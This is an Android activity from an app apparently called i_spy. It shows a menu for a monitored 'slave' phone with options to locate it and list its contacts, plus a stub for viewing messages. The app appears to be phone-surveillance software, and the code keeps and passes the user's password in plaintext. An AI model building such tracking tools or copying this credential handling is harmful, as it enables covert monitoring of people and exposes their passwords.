package com.um.asn.i_spy;

import android.app.Fragment;
import android.app.FragmentManager;
import android.content.Intent;
import android.os.Bundle;
import android.support.annotation.Nullable;
import android.support.v4.widget.DrawerLayout;
import android.support.v7.app.AppCompatActivity;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import android.widget.Toast;

import com.um.asn.i_spy.models.Phone;
import com.um.asn.i_spy.models.User;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;


public class SlaveMainActivity extends AppCompatActivity
        implements ShowSlaveContactsFragment.OnContactSelectedListener {

    // Position des items dans la list view
    private final static int LOCATE_SLAVE = 0;
    private final static int SHOW_CONTACTS = 1;
    private final static int TO_SLAVES_LIST = 2;
    Phone targetPhone;
    User currentUser;
    // Pour le navigation drawer (barre de menu latérale)
    private String[] slaveMenuItems;
    private DrawerLayout slaveMenuDrawerLayout;
    private ListView slaveMenuListView;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {

        try {
            super.onCreate(savedInstanceState);

            setContentView(R.layout.activity_slave_main);

            slaveMenuItems = getResources().getStringArray(R.array.slave_menu_items_array);
            slaveMenuDrawerLayout = (DrawerLayout) findViewById(R.id.slave_main_drawer_layout);
            slaveMenuListView = (ListView) findViewById(R.id.slave_main_list_view);

            // Set the adapter for the list view
            slaveMenuListView.setAdapter(new ArrayAdapter<String>(this,
                    R.layout.slave_menu_item, slaveMenuItems));

            // Set the list's click listener
            slaveMenuListView.setOnItemClickListener(new OnSlaveMenuItemClickListener());

            // Recuperation des infos du telephone pour lequel le menu est affiche
            Intent slaveMenuIntent = getIntent();

            targetPhone = new Phone(Integer.valueOf(slaveMenuIntent.getStringExtra("id")),
                    slaveMenuIntent.getStringExtra("login"));

            // Recuperation des infos utilisateur
            InputStream userInfoIS = openFileInput(Config.USER_INFO);
            BufferedReader userInfoBR = new BufferedReader(new InputStreamReader(userInfoIS));
            JSONObject userInfoJSON = new JSONObject(userInfoBR.readLine());

            currentUser = new User(Integer.valueOf(userInfoJSON.get("id").toString()),
                    userInfoJSON.get("mail").toString(),
                    userInfoJSON.get("password").toString());

            // Create a new fragment and specify the planet to show based on position
            Fragment fragment = new LocateSlaveFragment();

            Bundle args = new Bundle();
            args.putInt("phone_id", targetPhone.getId());
            args.putString("phone_login", targetPhone.getLogin());

            args.putInt("user_id", currentUser.getId());
            args.putString("user_mail", currentUser.getMail());
            args.putString("user_password", currentUser.getPassword());

            fragment.setArguments(args);

            // Insert the fragment by replacing any existing fragment
            FragmentManager fragmentManager = getFragmentManager();
            fragmentManager.beginTransaction()
                    .replace(R.id.slave_main_content_frame, fragment)
                    .commit();

            setTitle(getResources().getString(R.string.locate_slave_fragment_label) + " " + targetPhone.getLogin());

        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }

    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {

        getMenuInflater().inflate(R.menu.menu_slave_main, menu);
        return super.onCreateOptionsMenu(menu);

    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {

        switch (item.getItemId()) {

            case R.id.menu_item_show_drawer:
                if (slaveMenuDrawerLayout.isDrawerOpen(slaveMenuListView))
                    slaveMenuDrawerLayout.closeDrawer(slaveMenuListView);
                else slaveMenuDrawerLayout.openDrawer(slaveMenuListView);
                return true;


            case R.id.menu_item_to_slaves_list:
                Intent toSlavesListIntent = new Intent(this, ListSlavesActivity.class);
                startActivity(toSlavesListIntent);
                return true;
        }

        return super.onOptionsItemSelected(item);
    }

    /**
     * Swaps fragments in the main content view
     */
    private void selectItem(int position) {

        // Create a new fragment and specify the planet to show based on position
        Fragment fragment = null;
        // Insert the fragment by replacing any existing fragment
        FragmentManager fragmentManager = getFragmentManager();

        Bundle args = new Bundle();
        args.putInt("phone_id", targetPhone.getId());
        args.putString("phone_login", targetPhone.getLogin());

        args.putInt("user_id", currentUser.getId());
        args.putString("user_mail", currentUser.getMail());
        args.putString("user_password", currentUser.getPassword());

        switch (position) {
            case LOCATE_SLAVE:
                fragment = new LocateSlaveFragment();
                fragment.setArguments(args);
                fragmentManager.beginTransaction()
                        .replace(R.id.slave_main_content_frame, fragment)
                        .commit();
                break;

            case SHOW_CONTACTS:
                fragment = new ShowSlaveContactsFragment();
                fragment.setArguments(args);
                fragmentManager.beginTransaction()
                        .replace(R.id.slave_main_content_frame, fragment)
                        .commit();
                break;

            case TO_SLAVES_LIST:
                Intent toSlavesListIntent = new Intent(this, ListSlavesActivity.class);
                startActivity(toSlavesListIntent);
                break;

            default:
                fragment = new LocateSlaveFragment();
                fragment.setArguments(args);
                fragmentManager.beginTransaction()
                        .replace(R.id.slave_main_content_frame, fragment)
                        .commit();
                break;
        }

        // Highlight the selected item, update the title, and close the drawer
        slaveMenuListView.setItemChecked(position, true);
        setTitle(slaveMenuItems[position]);
        slaveMenuDrawerLayout.closeDrawer(slaveMenuListView);
    }

    @Override
    public void onContactSelected(int contactId) {

        Toast.makeText(this, "Affichage des messages du contact id = " + contactId, Toast.LENGTH_LONG).show();
        // Call to showMessagesFragment
    }

    private class OnSlaveMenuItemClickListener implements ListView.OnItemClickListener {
        @Override
        public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
            selectItem(position);
        }
    }
}
